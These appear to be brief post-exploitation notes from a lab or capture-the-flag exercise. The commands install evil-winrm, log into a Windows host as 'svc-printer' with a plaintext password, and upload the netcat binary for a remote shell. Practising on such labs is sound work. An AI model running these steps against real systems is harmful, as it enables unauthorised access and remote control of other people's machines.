#install  
gem install evil-winrm  
#login  
evil-winrm -i 10.10.10.233 -u svc-printer -p '1edFg43012!!'  
#upload  
upload /usr/share/windows-resources/binaries/nc.exe